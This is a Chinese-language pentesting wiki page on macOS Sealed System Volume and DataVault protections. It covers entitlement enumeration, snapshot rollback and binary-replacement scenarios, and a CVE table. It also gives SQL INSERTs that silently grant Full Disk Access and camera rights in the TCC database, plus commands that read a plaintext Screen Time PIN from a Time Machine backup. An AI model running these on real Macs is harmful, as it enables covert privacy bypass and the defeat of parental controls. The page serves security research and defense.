# macOS Sealed System Volume 与 DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### 基本信息

从 **macOS Big Sur (11.0)** 开始，系统卷使用 **APFS snapshot hash tree** 进行加密密封。这称为 **Sealed System Volume (SSV)**。系统分区以 **只读** 方式挂载，任何修改都会破坏该密封，并在启动期间进行验证。<sup>[[11]](#references)</sup>

SSV 提供：
- **篡改检测** — 对系统二进制文件或框架的任何修改都会改变 Merkle-tree 根，并使 Apple 签名的密封失效
- **启动时身份验证** — 启动链会在选定的系统 snapshot 成为根文件系统之前对其进行验证
- **Rootkit 防护** — 即使是 root，也无法在经过身份验证的系统 snapshot 中持久替换文件，除非禁用 authenticated root 或破坏经过授权的更新路径

SSV 保护的是 **System** 卷，而不是与其配对的可写 **Data** 卷。Firmlinks 将这两个卷合并到 `/` 可见的命名空间中，因此，一个看起来可写的路径并不能证明其底层对象属于经过密封的 snapshot。FileVault 和 Data Protection 负责静态数据的机密性；它们与 SSV 完整性相互独立。<sup>[[11]](#references)</sup>

### 检查 SSV 状态
```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / "

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```
### 有效系统视图：SSV + Cryptex grafts

在较新的 macOS 版本中，并非 `/System` 下可见的每个可执行文件都必然来自已启动的 SSV snapshot。**Cryptexes** 是经过单独身份验证的 APFS disk images，其内容会 graft 到选定目录之上；因此，Rapid Security Responses 可以替换与安全相关的组件，而无需重建基础 SSV。在排查 persistence 或对系统代码进行 diff 时，应盘点当前挂载内容和 Preboot Cryptex store，而不要只对基础 snapshot 进行 hashing：
```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```
boot-chain 和 Rapid Security Response 的详细信息请参阅 [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses)；本节重点介绍 SSV 边界本身。

### SSV Writer Entitlements

某些 Apple 系统二进制文件具有允许其修改或管理 sealed system volume 的 entitlements：

| Entitlement | Purpose |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | 将 system volume 恢复到之前的 snapshot |
| `com.apple.private.apfs.create-sealed-snapshot` | 系统更新后创建新的 sealed snapshot |
| `com.apple.rootless.install.heritable` | 写入受 SIP 保护的路径（由子进程继承） |
| `com.apple.rootless.install` | 写入受 SIP 保护的路径 |

### Finding SSV Writers
```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```
### 攻击场景

#### Snapshot Rollback Attack

如果攻击者入侵了一个具有 `com.apple.private.apfs.revert-to-snapshot` 权限的二进制文件，他们就可以**将系统卷回滚到更新前的状态**，从而恢复已知漏洞：
```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```
> [!WARNING]
> Snapshot rollback effectively **undoes security updates**, restoring previously-patched kernel and system vulnerabilities. This is one of the most dangerous operations possible on modern macOS.

#### 系统二进制替换

借助 SIP bypass + SSV 写入能力，攻击者可以：

1. 以读写方式挂载系统卷
2. 将系统 daemon 或 framework library 替换为植入木马的版本
3. 重新封装 snapshot（如果 SIP 已经降级，也可以接受已损坏的 seal）
4. rootkit 会在重启后持续存在，并且对 userland detection tools 不可见

### 真实世界中的 CVE

| CVE | 描述 |
|---|---|
| CVE-2021-30892 | **Shrootless** —— 利用 `system_installd` 的 `com.apple.rootless.install.heritable` entitlement 绕过 SIP，从而运行任意 post-install scripts（[Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)）<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass：`system_installd` 将 post-install script 暂存于 `/tmp` 下受 SIP 保护的文件夹中，但 `/tmp` 本身不受 SIP 保护，因此可以通过在其上挂载 image 来替换该文件夹（[Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)）<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** —— XNU 中的 copy-on-write race，允许向只读的 root-owned 文件写入内容（[Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/)）<sup>[[3]](#references)</sup> |

---

## DataVault

### 基本信息

**DataVault** 是一种由 entitlement 控制的文件系统保护机制，用于保护敏感文件和目录。BSD flag `UF_DATAVAULT` (`0x00000080`) 表示某个对象在读取和写入时都需要相应的 entitlement；与普通 DAC 不同，在保护机制生效时，仅成为 **root** 或获得 Full Disk Access 都无法满足该检查条件。<sup>[[4]](#references)[[13]](#references)</sup>

不要将“DataVault”用作所有受保护数据库的同义词。TCC 数据库由 TCC/FDA 和 SIP-specific policy 管理（参见 [macOS TCC](macos-tcc/README.md)），而 keychain item 的访问还取决于 Keychain ACL 和 cryptographic protection（参见 [macOS Keychain](../../macos-red-teaming/macos-keychain.md)）。实际的 DataVault 示例通常是位于 `/private/var/folders/.../0/` 下、由 service 所有的存储，例如 Screen Time store；当其父目录可以被 stat 时，可以在 BSD file flags 中看到 `datavault` flag。

### DataVault Controller Entitlements

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | 访问/管理 `UF_DATAVAULT` 对象<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | 管理 TCC decisions；这是一个相关但独立的隐私边界 |
| `com.apple.private.tcc.allow` | 绕过 entitlement value 中指定的 TCC services |
| `com.apple.rootless.storage.TCC` | 写入受 SIP 保护的 TCC store |

将 DataVault-controller entitlement 与 FDA、backup、indexing 或 IPC functionality 结合的进程尤其值得关注：应寻找一种 confused-deputy primitive，使其将受保护对象复制到普通路径，而不是尝试直接打开 vault。<sup>[[14]](#references)</sup>

### 查找 DataVault Controllers
```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```
### 攻击场景

#### 直接修改 TCC 数据库（独立的 TCC 边界）

如果攻击者 compromise 了 TCC manager 进程（例如通过代码注入到一个携带 `com.apple.private.tcc.manager` 的进程中），他们就可以**直接修改 TCC 数据库**，向任何应用授予任意 TCC 权限：<sup>[[12]](#references)</sup>
```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```
> [!CAUTION]
> 修改 TCC database 是**终极隐私绕过**——它可以静默授予任意权限，不会显示任何用户提示或可见指示。历史上，多个 macOS privilege escalation 链最终都以写入 TCC database 作为 payload。

#### Keychain Database Access

直接访问 keychain backing database 并不等同于访问明文 secret。如果其他 privilege boundary 允许攻击者复制该 database，仍然必须攻击 key material 和 item ACL；请参阅专门的 [macOS Keychain](../../macos-red-teaming/macos-keychain.md) 页面，而不要假设 DataVault-controller entitlement 本身就足够。

#### Backup-copy boundary: Time Machine

2026 年的一项分析展示了一个有用的通用模式：`backupd` 同时具备 `com.apple.rootless.datavault.controller` 和 Full Disk Access，因此可以复制受保护的 stores。在测试配置中，`/private/var/folders` 被包含在 Time Machine 中，而挂载的 backup copy 不会强制执行实时 DataVault boundary。研究人员利用这一点定位 Screen Time SQLite store，并在不打开 live vault 的情况下读取其中的明文 restrictions PIN。应将其视为一种**copy-boundary attack**：枚举能够在较弱的 mount 或 path 下 materialize vault data 的 backup、export、migration、indexing 和 diagnostic deputies。<sup>[[13]](#references)[[14]](#references)</sup>
```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```
此行为取决于系统版本和备份布局。请在目标 build 上验证，并记住：加密的 Time Machine 目标仅在锁定时保护其中的副本；一旦挂载，其访问控制就会成为攻击面的一部分。

### 涉及 DataVault/TCC Bypass 的真实 CVE

| CVE | Description |
|---|---|
| CVE-2024-44131 | FileProvider 中的 symlink race 使 privileged helper 能够访问受 TCC 保护的数据 ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | 以 root 身份，**创建一个 `NFSHomeDirectory` 指向攻击者控制的 `TCC.db` 的新用户**；登录时 `tccd` 会读取该文件并应用其中的授权，从而访问其他用户的数据 ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir"：修改用户的 home dir，以植入攻击者控制的 TCC.db ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Bundle-conclusion flaw 使 app 能够**继承 donor bundle 的 TCC 授权**而无需提示；该漏洞曾被 **XCSSET** 在野外利用来截取桌面屏幕截图 ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` 根据 `$HOME` 构建 DB 路径，因此 `launchctl setenv HOME` 可将其重定向到攻击者控制的 `TCC.db` ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` 持有 `com.apple.private.tcc.manager` **且禁用了 library validation**，因此放置在 `/Library/Audio/Plug-Ins/HAL` 中的 HAL plug-in 可以授予任意 TCC 权限 ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft 发现新的 macOS 漏洞 Shrootless，可能绕过 System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Technical Analysis: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Data Protection](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131：TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Uncovering macOS Malware：Bypassing TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [新的 macOS 漏洞“powerdir”可能导致未经授权的用户数据访问](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [在 XCSSET malware 中发现 Zero-Day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934：绕过 macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [The Nightmare of Apple OTA Updates (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [How to bypass your own Screen Time passcode — source and Time Machine/DataVault analysis](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
